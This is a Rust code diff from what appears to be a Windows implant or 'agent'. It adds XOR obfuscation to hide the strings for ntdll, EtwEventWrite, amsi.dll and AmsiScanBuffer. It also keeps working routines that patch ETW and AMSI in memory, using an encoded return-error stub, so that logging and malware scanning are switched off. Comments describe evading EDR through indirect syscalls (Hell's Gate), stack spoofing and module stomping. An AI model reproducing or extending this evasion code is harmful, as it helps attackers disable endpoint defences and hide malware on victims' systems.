@@ -49,8 +49,9 @@ pub fn should_abort() -> bool {
 ///   4. stack-spoof init — scan ntdll for ret gadget (needs clean ntdll)
 ///   5. stomped module loader — remap agent pages into a legitimate DLL (cosmetic)
 pub fn startup_patches() {
-    #[cfg(all(target_os = "windows", feature = "unhook"))]
-    unhook_ntdll();
+    // unhook_ntdll is intentionally NOT called here — we use indirect syscalls (Hell's Gate)
+    // to bypass user-land EDR hooks without touching ntdll .text, which triggers BD kernel
+    // callbacks. The unhook feature still compiles but is invoked separately if needed.
 
     #[cfg(all(target_os = "windows", feature = "etw-patch"))]
     patch_etw();
@@ -200,9 +201,11 @@ pub fn patch_etw() {
     use windows_sys::Win32::System::Memory::VirtualProtect;
 
     unsafe {
-        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
+        let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
+        let s_etw   = crate::obfs::dec(&[0x1F,0x2E,0x2D,0x1F,0x2C,0x3F,0x34,0x2E,0x0D,0x28,0x33,0x2E,0x3F,0x5A]);
+        let ntdll = GetModuleHandleA(s_ntdll.as_ptr());
         if ntdll == 0 { return; }
-        let fn_ptr = match GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr()) {
+        let fn_ptr = match GetProcAddress(ntdll, s_etw.as_ptr()) {
             Some(p) => p as *mut u8,
             None => return,
         };
@@ -226,19 +229,19 @@ pub fn patch_amsi() {
 
     // AMSI is a late-loaded DLL; load it if not yet mapped.
     unsafe {
+        let s_amsi = crate::obfs::dec(&[0x3B,0x37,0x29,0x33,0x74,0x3E,0x36,0x36,0x5A]);
+        let s_asb  = crate::obfs::dec(&[0x1B,0x37,0x29,0x33,0x09,0x39,0x3B,0x34,0x18,0x2F,0x3C,0x3C,0x3F,0x28,0x5A]);
         let amsi = {
-            let h = GetModuleHandleA(b"amsi.dll\0".as_ptr());
-            if h != 0 { h } else { LoadLibraryA(b"amsi.dll\0".as_ptr()) }
+            let h = GetModuleHandleA(s_amsi.as_ptr());
+            if h != 0 { h } else { LoadLibraryA(s_amsi.as_ptr()) }
         };
         if amsi == 0 { return; }
-        let fn_ptr = match GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr()) {
+        let fn_ptr = match GetProcAddress(amsi, s_asb.as_ptr()) {
             Some(p) => p as *mut u8,
             None => return,
         };
-        // Patch: B8 57 00 07 80  C3
-        //        mov eax, 0x80070057 (E_INVALIDARG)
-        //        ret
-        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
+        let patch_enc: [u8; 6] = [0xE2, 0x0D, 0x5A, 0x5D, 0xDA, 0x99];
+        let patch: [u8; 6] = patch_enc.map(|b| b ^ crate::obfs::KEY);
         let mut old_prot: u32 = 0;
         if VirtualProtect(fn_ptr as *const core::ffi::c_void, patch.len(), 0x40, &mut old_prot) == 0 {
             return;
@@ -260,7 +263,8 @@ pub fn unhook_ntdll() {
 
     unsafe {
         // Locate in-memory ntdll
-        let ntdll_mem = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
+        let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
+        let ntdll_mem = GetModuleHandleA(s_ntdll.as_ptr()) as *const u8;
         if ntdll_mem.is_null() { return; }
 
         // Build path to on-disk ntdll
